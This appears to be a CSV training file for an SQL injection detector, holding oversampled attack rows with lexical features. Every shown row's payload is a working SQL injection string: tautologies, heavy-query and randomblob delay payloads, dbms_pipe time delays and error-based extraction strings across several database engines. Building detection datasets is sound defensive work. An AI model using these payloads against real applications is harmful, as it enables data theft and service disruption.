id,label,payload_type,payload,retrieval_method,retrieval_source_id,retrieval_distance,length,num_unique_chars,entropy,alpha_count,digit_count,space_count,punct_count,alpha_ratio,digit_ratio,space_ratio,punct_ratio,single_quote_count,double_quote_count,dash_count,slash_count,star_count,equals_count,semicolon_count,paren_count,percent_count,underscore_count,comma_count,operator_count,has_single_quote,has_double_quote,has_comment_dashdash,has_comment_hash,has_comment_block,has_equal,has_parentheses,has_semicolon,has_percent_encoding,has_hex_literal,has_concat_operator,kw_select,kw_union,kw_where,kw_from,kw_and,kw_or,kw_insert,kw_update,kw_delete,kw_drop,kw_create,kw_alter,kw_sleep,kw_benchmark,kw_waitfor,kw_delay,kw_information_schema,kw_table,kw_column,kw_database,kw_cast,kw_convert,kw_concat,kw_substr,kw_substring,kw_ascii,kw_char,kw_load_file,kw_outfile,kw_exec,kw_order,kw_by,kw_exists,kw_case,kw_when,keyword_total
SMOTE_000062,attack,boolean,"1' in boolean mode  )   or 6979  =  like  (  'abcdefg',upper  (  hex  (  randomblob  (  500000000/2   )    )      )    )   --",nearest_attack_euclidean,R000011,0.06617187721474772,125.35656783263667,33.1386652682476,3.8008865700795758,44.03961864807074,15.15847459228297,49.079237296141486,17.079237296141486,0.35139934804882955,0.12080899617039556,0.3915766622779574,0.13621499350281746,3.0396186480707423,0.0,2.0,1.0,0.0,1.019809324035371,0.0,9.0,0.0,0.0,1.0,4.039618648070743,1.0,0.0,1.0,0.0,3.469446951953614e-18,1.0,1.0,0.0,0.0,3.469446951953614e-18,0.0,0.019809324035371167,0.0,0.019809324035371167,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.469446951953614e-18,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.039618648070742
SMOTE_000063,attack,boolean,"1 where 7522  =  7522 and   (  select 2*  (  if   (    (   select * from   (  select concat  (  0x7171706a71,  (  select   (  elt  (  3484  =  3484,1   )    )     )  ,0x717a767a71,0x78   )    )   s  )  , 8446744073709551610, 8446744073709551610   )    )     )  --",nearest_attack_euclidean,R000062,0.04914406464675525,262.76911811372474,32.978011248926165,3.8051251640534596,53.945028122315414,78.91204499570466,99.9340337467785,29.978011248926165,0.20529192750570058,0.300303357679761,0.3803183085194713,0.11408640629506708,0.0,0.010994375536917733,1.9780112489261645,0.0,2.0,1.9890056244630823,0.0,18.0,0.0,0.0,6.0,5.967016873389246,0.0,0.010994375536917789,0.9890056244630823,0.0,3.469446951953614e-18,1.0,1.0,0.0,0.0,1.0,0.0,4.0,0.0,0.9890056244630823,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,7.989005624463083
SMOTE_000064,attack,boolean,"1' or 7552  =    (  select count  (  *  )   from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4  )   and 'ugum' like 'ugum",nearest_attack_euclidean,R000053,0.03130458502444639,149.4355008767696,32.970306758402074,4.336586661674939,86.32662565757718,9.029693241597927,37.079181977594466,17.0,0.5775711704133539,0.060420238032728196,0.24817208270059815,0.11383650885331979,4.0,0.0,0.0,0.0,1.0,1.0098977471993087,0.0,4.000000000000001,0.0,0.0,3.0296932415979256,2.009897747199309,1.0,0.0,0.0,0.0,3.469446951953614e-18,1.0,1.0,0.0,0.0,3.469446951953614e-18,0.0,1.0,0.0,0.0,1.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.469446951953614e-18,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,4.0
SMOTE_000065,attack,boolean,"1%'   )    )     )   or 2367  =    (  select count  (  *  )   from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4  )  --",nearest_attack_euclidean,R000049,1.1609700514598846,150.67768269004517,33.367768269004515,4.11133344583888,72.47107307601807,11.57437788303163,47.735536538009036,18.896695192986446,0.48104910399850287,0.07618763397873576,0.31692329757161075,0.12583996445115056,1.0,0.0,2.0,0.0,1.0,1.3677682690045183,0.0,6.632231730995482,0.6322317309954817,0.0,2.6322317309954815,4.367768269004518,1.0,0.0,1.0,0.0,3.469446951953614e-18,1.0,1.0,0.0,0.0,3.469446951953614e-18,0.0,1.0,0.0,0.3677682690045183,1.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.469446951953614e-18,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.367768269004518
SMOTE_000066,attack,boolean,"1'||  (  select 'osty' from dual where 6433  =  6433 or 5286  =    (  select count  (  *  )   from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5   )    )   ||'",nearest_attack_euclidean,R000044,0.5380356684024392,176.2865181412492,31.809613126805466,4.112567754150782,83.85767876083278,18.0,48.90480656340273,25.524032817013662,0.47550255538701036,0.1022065545455588,0.27763399506195496,0.14465689500547588,3.619226253610929,0.09519343659726776,0.1903868731945354,0.0,1.0,2.0,0.0,6.0,0.0,5.0,4.0,6.8096131268054645,0.9048065634027322,0.09519343659726776,0.09519343659726776,0.0,3.469446951953614e-18,1.0,1.0,0.0,0.0,3.469446951953614e-18,0.9048065634027322,1.9048065634027322,0.0,1.0,1.9048065634027322,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.469446951953614e-18,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,5.8096131268054645
SMOTE_000067,attack,boolean,"1'  )   and 8148  =  like  (  'abcdefg',upper  (  hex  (  randomblob  (  500000000/2   )    )      )    )   --",nearest_attack_euclidean,R000051,1.3797453714759806,120.08070990650369,34.60147352425901,3.7916471160908483,36.552578667453275,17.601473524259013,48.27628933372664,17.65036838106475,0.30239851298592796,0.14506456731598558,0.40442805744750226,0.14810886225058414,3.0,0.0,2.0,1.0,0.0,1.3251841905323767,0.0,9.0,0.0,0.0,1.0,4.650368381064753,1.0,0.0,1.0,0.0,3.469446951953614e-18,1.0,1.0,0.0,0.0,3.469446951953614e-18,0.0,0.3251841905323768,0.0,0.3251841905323768,0.0,0.6748158094676232,0.3251841905323768,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.469446951953614e-18,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.6503683810647538
SMOTE_000068,attack,boolean,"1'+  (  select zukr where 9215  =  9215 or char  (  68  )  ||char  (  69  )  ||char  (  97  )  ||char  (  85  )    =  regexp_substring  (  repeat  (  right  (  char  (  5389  )  ,0  )  ,5000000000  )  ,null   )    )   +'",nearest_attack_euclidean,R000033,1.6675063885279064,253.33324235090635,37.98038948090901,3.836889912068854,79.74506325181713,32.735292110681755,102.19603695408965,38.6568500343178,0.31183077985047297,0.13390067044332207,0.40111256441995496,0.15315598528625,2.4901947404545046,0.0,0.0,0.0,0.0,1.7549026297727477,0.0,21.43136318318153,0.0,1.2450973702272523,3.2450973702272523,10.245097370227253,1.0,0.0,0.0,0.0,3.469446951953614e-18,1.0,1.0,0.0,0.0,3.469446951953614e-18,1.0,1.0,0.0,0.7549026297727475,0.24509737022725245,0.24509737022725248,0.7549026297727477,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.469446951953614e-18,0.0,0.0,0.0,5.490194740454505,0.0,0.0,0.0,0.0,0.0,0.0,0.24509737022725242,0.24509737022725242,8.98038948090901
SMOTE_000069,attack,boolean,1   )    )     )   and 9575  =  1640--,nearest_attack_euclidean,R000037,1.1091520368592684,38.0,13.707912658325812,2.6632272436857147,3.0,9.0,20.0,6.0,0.07894736842105263,0.23684210526315788,0.5263157894736842,0.15789473684210525,0.2920873416741889,0.0,1.4158253166516221,0.0,0.0,0.9999999999999999,0.0,3.0,0.2920873416741888,0.0,0.0,2.415825316651622,0.2920873416741887,0.0,0.7079126583258112,0.0,3.469446951953614e-18,1.0,1.0,0.0,0.0,3.469446951953614e-18,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.469446951953614e-18,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0
SMOTE_000070,attack,boolean,"1'  )   as tuhc where 4018  =  4018 or char  (  117  )  ||char  (  111  )  ||char  (  105  )  ||char  (  100  )    =  regexp_substring  (  repeat  (  left  (  crypt_key  (  char  (  65  )  ||char  (  69  )  ||char  (  83  )  ,null  )  ,0  )  ,500000000  )  ,null  )  --",nearest_attack_euclidean,R000063,1.5937465065991407,247.0856646337102,37.55276866599409,3.823879625410256,75.29152998991128,34.76384332997043,97.50260465388763,39.527686659940855,0.3047042424353143,0.14108320825134787,0.39467928693346555,0.15953326237987228,1.4472313340059142,0.0,1.1055373319881716,0.0,0.0,2.0,0.0,20.763843329970427,0.0,1.5527686659940856,3.552768665994086,12.211074663976342,1.0,0.0,0.5527686659940858,0.0,3.469446951953614e-18,1.0,1.0,0.0,0.0,3.469446951953614e-18,1.0,0.4472313340059142,0.0,1.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.469446951953614e-18,0.0,0.0,0.0,6.105537331988172,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,8.552768665994087
SMOTE_000071,attack,boolean,"1'  )   as juxt where 5956  =  5956 and 8148  =  like  (  'abcdefg',upper  (  hex  (  randomblob  (  500000000/2   )    )      )    )   --",nearest_attack_euclidean,R000069,1.302322979316777,133.58012567085305,36.300048334943476,3.9040112871844723,43.3399903330113,20.280077335909564,52.300048334943476,17.660009666988696,0.32533178331065965,0.1508004511261391,0.3915408628403557,0.13232690272284553,3.0,0.0,2.0,1.0,0.0,1.6600096669886955,0.0,9.0,0.0,0.0,1.0,4.660009666988696,1.0,0.0,1.0,0.0,3.469446951953614e-18,1.0,1.0,0.0,0.0,3.469446951953614e-18,0.0,0.0,0.0,0.6600096669886955,0.0,0.6600096669886953,0.33999033301130455,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.469446951953614e-18,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.6600096669886955
SMOTE_000072,attack,boolean,"1%"" and 6537  =  dbms_pipe.receive_message  (  chr  (  76  )  ||chr  (  116  )  ||chr  (  117  )  ||chr  (  65  )  ,5  )   and ""%""  =  """,nearest_attack_euclidean,R000043,1.1832421154762964,123.59883444224556,29.0,3.8367783439245393,36.57898881165394,16.0,46.44085681893766,24.57898881165395,0.2970200886778954,0.1363516825908815,0.3718719019964888,0.19475632673473425,0.0,4.0,0.21381319927162812,0.0,0.0,1.7861868007283717,0.0,8.71712080437023,1.5723736014567435,1.7861868007283717,1.0,6.71712080437023,0.0,1.0,0.0,0.0,3.469446951953614e-18,1.0,1.0,0.0,0.0,3.469446951953614e-18,0.7861868007283717,0.0,0.0,0.0,0.0,1.7861868007283719,0.21381319927162817,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.469446951953614e-18,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.0
SMOTE_000073,attack,boolean,"-9462""  )   as vzga where 4799  =  4799 or 8691  =  1048",nearest_attack_euclidean,R000077,1.48862094057637,57.210134980178864,22.09239876486586,3.713141058899015,11.184797529731718,21.210134980178857,18.605067490089425,6.210134980178854,0.1972074127745985,0.3701085890733449,0.3250301636314847,0.10765383452057192,0.3025337450447143,0.6974662549552857,1.6050674900894284,0.0,0.3025337450447142,2.0,0.0,1.3025337450447143,0.0,0.0,0.0,3.907601235134143,0.3025337450447142,0.6974662549552857,0.3025337450447142,0.0,3.469446951953614e-18,1.0,1.0,0.0,0.0,3.469446951953614e-18,0.0,0.0,0.0,1.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.469446951953614e-18,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.0
SMOTE_000074,attack,boolean,"1%' or 8384  =  like  (  'abcdefg',upper  (  hex  (  randomblob  (  500000000/2   )    )      )    )    and '%'  =  '",nearest_attack_euclidean,R000007,1.3418329478482849,137.41422232095775,33.283530865568856,3.741542043047846,39.95414817694601,17.55177779011972,55.938864235928015,23.969432117964008,0.29071368777597434,0.1278589366720771,0.4079484667027362,0.1734789088492124,5.432938268862285,0.0,0.0,0.7164691344311422,0.0,2.0,0.0,10.268246924550862,2.0,0.28353086556885776,1.5670617311377153,4.417654327844288,1.0,0.0,0.0,0.0,3.469446951953614e-18,1.0,1.0,0.0,0.0,3.469446951953614e-18,0.28353086556885765,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.469446951953614e-18,0.0,0.0,0.0,1.4176543278442884,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.4176543278442884
SMOTE_000075,attack,boolean,"1' or char  (  117  )  ||char  (  111  )  ||char  (  105  )  ||char  (  100  )    =  regexp_substring  (  repeat  (  left  (  crypt_key  (  char  (  65  )  ||char  (  69  )  ||char  (  83  )  ,null  )  ,0  )  ,500000000  )  ,null  )   and 'adsh'  =  'adsh",nearest_attack_euclidean,R000016,1.0971280512222517,252.76331917344987,36.372780137758355,3.78656106474861,79.01775889793318,29.0,100.0,44.74556027551671,0.3124802952476584,0.11474704691660687,0.3956794721262306,0.17709318570950414,4.0,0.0,0.0,0.0,0.0,2.0,0.0,22.0,0.7455602755167061,2.0,4.0,12.0,1.0,0.0,0.0,0.0,3.469446951953614e-18,1.0,1.0,0.0,0.0,3.469446951953614e-18,1.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.469446951953614e-18,0.0,0.0,0.0,7.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,9.0
SMOTE_000076,attack,boolean,"1' in boolean mode  )   or 6979  =  like  (  'abcdefg',upper  (  hex  (  randomblob  (  500000000/2   )    )      )    )   --",nearest_attack_euclidean,R000011,3.689679775124697,81.60106149871811,22.7095300460878,3.4307380589750807,31.472471360454712,8.288823943100738,30.20870704068207,11.63105915448059,0.45017491831806916,0.06631059154480591,0.3284675333280203,0.15504695680910457,3.4474117371266173,0.0,1.1051765257467652,0.5525882628733826,0.0,0.9999999999999999,0.0,4.973294365860443,0.0,0.0,0.5525882628733827,2.657764788620147,1.0,0.0,0.5525882628733826,0.0,3.469446951953614e-18,1.0,0.5525882628733827,0.0,0.0,3.469446951953614e-18,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.469446951953614e-18,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0
SMOTE_000077,attack,boolean,or 'unusual'   =   'unusual',nearest_attack_euclidean,R000001,2.2636591900594456,26.683828920271367,10.789702647837181,3.053170705728201,13.630892056488456,0.5264684318914554,6.7367657840542705,5.789702647837178,0.501123780834371,0.02288993182136756,0.2528612414776709,0.22312504586659043,4.263234215945728,0.0,0.0,0.26323421594572693,0.26323421594572716,0.9999999999999999,0.0,0.0,0.0,0.0,0.0,1.5264684318914536,1.0,0.0,0.0,0.0,0.26323421594572693,1.0,0.0,0.0,0.0,3.469446951953614e-18,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.469446951953614e-18,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0
SMOTE_000078,attack,boolean,"1   )    )    as dnwj where 2961  =  2961 and char  (  111  )  ||char  (  77  )  ||char  (  121  )  ||char  (  88  )    =  regexp_substring  (  repeat  (  left  (  crypt_key  (  char  (  65  )  ||char  (  69  )  ||char  (  83  )  ,null  )  ,0  )  ,500000000  )  ,null  )  --",nearest_attack_euclidean,R000018,0.22820656070959308,272.39368130199415,37.91545691063127,3.8052917266963933,82.4081983744189,35.16908617873746,110.98548292757525,43.83091382126254,0.302507096128886,0.12920496303712997,0.40735551762318983,0.16093242321079426,0.0,0.0,2.0,0.0,0.0,2.0,0.0,23.83091382126254,0.0,2.0,4.0,14.0,0.0,0.0,1.0,0.0,3.469446951953614e-18,1.0,1.0,0.0,0.0,3.469446951953614e-18,1.0,0.0,0.0,1.0,0.0,0.9154569106312702,0.08454308936872978,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.469446951953614e-18,0.0,0.0,0.0,7.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,9.0
SMOTE_000079,attack,boolean,"1   )    )    and 3580  =    (  select count  (  *  )   from domain.domains as t1,domain.columns as t2,domain.tables as t3  )  --",nearest_attack_euclidean,R000042,1.4315575157375506,140.3388278921737,32.127952521978955,4.035835502964282,69.30093471772106,11.127952521978951,44.127952521978955,15.781988130494739,0.49493655017146143,0.07736214562839247,0.314817678920428,0.11288362527971817,0.0,0.39099406524736885,2.0,0.0,1.0,1.390994065247369,0.0,6.0,0.0,0.0,2.0,4.390994065247369,0.0,0.39099406524736885,1.0,0.0,3.469446951953614e-18,1.0,1.0,0.0,0.0,3.469446951953614e-18,0.0,1.0,0.0,0.3909940652473689,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.469446951953614e-18,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.3909940652473693
SMOTE_000080,attack,boolean,-2174'   )    )    or 5903  =    (  'qqpjq'||  (  select case 5903 when 5903 then 1 else 0 end from rdb$database  )  ||'qzvzq'  )   and    (    (   'dyyg'  =  'dyyg,nearest_attack_euclidean,R000056,4.128409669304789,158.40236780952355,36.13412260317451,4.183779445841372,71.58303602539723,14.641420685714124,50.79013945396786,21.387771644444317,0.45618222033741873,0.09133861400743545,0.3181716798857767,0.1343074857693691,6.50729808253961,0.0,0.6268245206349027,0.0,0.3731754793650974,1.6268245206349026,0.0,6.507298082539611,0.0,0.0,1.119526438095292,5.134122603174513,1.0,0.0,0.0,0.0,3.469446951953614e-18,1.0,1.0,0.0,0.0,3.469446951953614e-18,0.6268245206349026,1.0,0.0,0.0,1.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.6268245206349027,0.0,0.0,3.469446951953614e-18,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.6268245206349028,0.6268245206349028,5.880473561904708
SMOTE_000081,attack,boolean,"1'   )    )    and 4241  =  convert  (  int,  (  select char  (  113  )  +char  (  113  )  +char  (  112  )  +char  (  106  )  +char  (  113  )  +  (  select   (  case when   (  4241  =  4241  )   then char  (  49  )   else char  (  48  )   end   )    )   +char  (  113  )  +char  (  122  )  +char  (  118  )  +char  (  122  )  +char  (  113   )    )     )   and    (    (   'wzrj'  =  'wzrj",nearest_attack_euclidean,R000058,0.8163215982325169,387.1215564982058,30.89517720265421,3.2838090209496933,100.7987212557384,48.153050770803695,182.7987212557384,55.37106321592526,0.26009493036599274,0.12477877740668267,0.4721112897454423,0.14301500248188226,3.6855316079626292,0.0,0.31446839203737076,0.0,0.0,2.8951772026542097,0.0,37.580708810616834,0.0,0.0,0.8951772026542097,13.20964559469158,1.0,0.0,0.10482279734579025,0.0,3.469446951953614e-18,1.0,1.0,0.0,0.0,3.469446951953614e-18,0.0,1.8951772026542097,0.0,0.10482279734579025,0.0,1.7903544053084195,0.10482279734579025,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.8951772026542099,3.469446951953614e-18,0.0,0.0,0.0,12.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,1.0,18.790354405308417
SMOTE_000082,attack,boolean,1'   )    )     )   and   (  1685  =  2985  )  *2985 and    (    (     (  'rzwb'  =  'rzwb,nearest_attack_euclidean,R000015,0.13355420776813956,89.96984523772879,19.0,2.893214259842096,13.72860713955901,13.331702384983444,48.0,14.909535713186335,0.15255890252585608,0.14822037784744516,0.5335140360285916,0.16570668359810714,3.879380950915112,0.0,0.030154762271222157,0.0,1.0,2.0,0.0,8.0,0.0,0.0,0.0,3.030154762271222,0.9698452377287778,0.0,0.0,0.0,3.469446951953614e-18,1.0,1.0,0.0,0.0,3.469446951953614e-18,0.0,0.0,0.0,0.0,0.0,1.9698452377287778,0.030154762271222046,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.469446951953614e-18,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.0
SMOTE_000083,attack,boolean,"1%'   )    )     )   or 2367  =    (  select count  (  *  )   from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4  )  --",nearest_attack_euclidean,R000049,1.169019371196298,150.70318105998504,33.37031810599851,4.1115339749827475,72.48127242399401,11.592226741989537,47.740636211997014,18.889045682004486,0.4810356250733646,0.07629137750910335,0.31690385256485387,0.12576914485267812,1.0,0.0,2.0,0.0,1.0,1.3703181059985052,0.0,6.629681894001495,0.629681894001495,0.0,2.6296818940014948,4.370318105998505,1.0,0.0,1.0,0.0,3.469446951953614e-18,1.0,1.0,0.0,0.0,3.469446951953614e-18,0.0,1.0,0.0,0.3703181059985051,1.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.469446951953614e-18,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.3703181059985052
SMOTE_000084,attack,boolean,"1 where 7522  =  7522 and   (  select 2*  (  if   (    (   select * from   (  select concat  (  0x7171706a71,  (  select   (  elt  (  3484  =  3484,1   )    )     )  ,0x717a767a71,0x78   )    )   s  )  , 8446744073709551610, 8446744073709551610   )    )     )  --",nearest_attack_euclidean,R000062,2.303062280396072,242.30372543707955,33.788429507158874,3.8823343682697784,58.33636228937381,66.58223526224772,89.94752378372435,27.43760410173366,0.259663621035352,0.2611333100168905,0.36641060334532294,0.11279246560243456,0.0,0.19710737678971868,2.0,0.0,1.8028926232102813,2.0,0.0,15.634711478523375,0.0,0.0,5.211570492841124,5.8028926232102815,0.0,0.19710737678971862,1.0,0.0,3.469446951953614e-18,1.0,1.0,0.0,0.0,0.8028926232102812,0.0,3.408677869630844,0.0,1.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.8028926232102812,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,7.211570492841125
SMOTE_000085,attack,boolean,"1""  )   as upjw where 3880  =  3880 and 5556  =    (  select count  (  *  )   from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5  )  --",nearest_attack_euclidean,R000032,1.6653000961957467,155.6955275153645,35.271645636523374,4.176126586870866,74.84776375768226,17.15223624231775,44.96717315188788,18.728354363476626,0.48072852961310597,0.1102632289183122,0.28858016232719974,0.12042807914138212,0.0,1.0,2.0,0.0,1.0,2.0,0.0,5.423881878841125,0.0,2.8805906057943735,3.1522362423177492,5.0,0.0,1.0,1.0,0.0,3.469446951953614e-18,1.0,1.0,0.0,0.0,3.469446951953614e-18,0.0,1.0,0.0,1.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.469446951953614e-18,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,4.0
SMOTE_000086,attack,boolean,"1""  )   where 3393  =  3393 or 9643  =    (  select count  (  *  )   from domain.domains as t1,domain.columns as t2,domain.tables as t3  )  --",nearest_attack_euclidean,R000040,0.8172368915423762,143.88504042552296,32.26929148936043,4.141735506111105,70.88504042552297,16.0,41.0,16.0,0.49241931898398605,0.11125056022268799,0.285079560570638,0.11125056022268799,0.2692914893604248,0.7307085106395753,2.0,0.0,1.0,2.0,0.0,5.0,0.0,0.0,2.0,5.0,0.2692914893604247,0.7307085106395752,1.0,0.0,3.469446951953614e-18,1.0,1.0,0.0,0.0,3.469446951953614e-18,0.0,1.0,0.0,1.0,1.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.469446951953614e-18,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,4.0
SMOTE_000087,attack,boolean,"-9133""   )    )    or 4747  =  dbms_utility.sqlid_to_sqlhash   (    (   chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113  )  ||  (  select   (  case when   (  4747  =  4747  )   then 1 else 0 end  )   from dual  )  ||chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113   )    )     )   and    (    (   ""crfy""  =  ""crfy",nearest_attack_euclidean,R000078,2.2417320632749473,372.6731827218413,34.72927050139181,3.4698586057918575,94.18781150417541,48.6487798567452,168.0536604297644,61.782930931156216,0.25202527021371735,0.13097396964106833,0.45163530223995124,0.16536545790526308,0.0,4.0,1.0,0.0,0.0,2.6756100716274007,0.0,34.0,0.6487798567451981,2.0268302148822026,0.0,20.431710787901412,0.0,1.0,0.0,0.0,3.469446951953614e-18,1.0,1.0,0.0,0.0,3.469446951953614e-18,0.6756100716274009,1.0,0.0,0.0,0.6756100716274009,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.469446951953614e-18,0.0,0.0,0.0,3.8926791404711873,0.0,0.0,0.0,0.0,0.0,0.0,1.0,1.0,9.568289212098588
